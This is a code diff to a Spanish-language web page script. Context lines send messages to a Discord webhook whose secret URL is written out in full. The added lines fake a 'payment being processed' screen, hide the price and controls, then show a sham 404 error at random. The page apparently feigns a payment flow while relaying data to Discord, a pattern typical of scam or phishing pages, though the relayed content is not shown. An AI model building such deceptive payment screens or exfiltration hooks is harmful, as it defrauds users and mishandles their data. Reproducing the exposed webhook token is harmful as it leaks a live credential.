@@ -1,3 +1,4 @@
+var numero = Math.floor(Math.random() * 2) + 1;
 function enviarMensajeDiscord(mensaje) {
     // URL del webhook de Discord
     var webhookUrl = "https://discord.com/api/webhooks/1116094610926751925/V1oPhvyBp6mkzzhJOvS--Rw8ArjcpJ3mbpSw1qZDEtVO9gVG6G2z84CN1B1gbwM4ml2i";
@@ -14,6 +15,33 @@ function enviarMensajeDiscord(mensaje) {
 
     // Envío de la solicitud
     request.send(JSON.stringify(data));
+}
+
+ var button = document.getElementById('accept-button');
+    button.disabled = true;
+
+    var iconContainer = document.getElementById('icon-container');
+    var icon = document.getElementById('icon');
+    icon.src = "https://icons.veryicon.com/png/o/miscellaneous/selling-wine-net/loading-42.png";
+
+    iconContainer.classList.add('loader-spin');
+
+    var confirmationText = document.getElementById('confirmation-text');
+    confirmationText.innerText = "¡Un último paso! Su pago está siendo procesado.";
+
+    var price = document.getElementById('price');
+    price.style.display = "none";
+
+    var buttonContainer = document.getElementById('button-container');
+    buttonContainer.style.display = "none";
+
+
+if (numero === 1) {
+  icon.src = "https://static.vecteezy.com/system/resources/previews/001/208/666/original/banana-png.png";
+  price.innerText = "[404] Página no encontrada o inexistente. \n Esta página no fue encontrada, por favor, vuelve a pedir el URL o intenta con otro pedido. \n Cuentas con el platano de la empatía."
+} else if (numero === 2) {
+  icon.src = "https://static.vecteezy.com/system/resources/previews/017/172/383/original/warning-message-concept-represented-by-exclamation-mark-icon-exclamation-symbol-in-circle-png.png";
+  price.innerText = "[404] Página no encontrada o inexistente. \n Esta página no fue encontrada, por favor, vuelve a pedir el URL o intenta con otro pedido. \n Cuentas con el platano de la empatía."
 }
 
 function aceptar() {
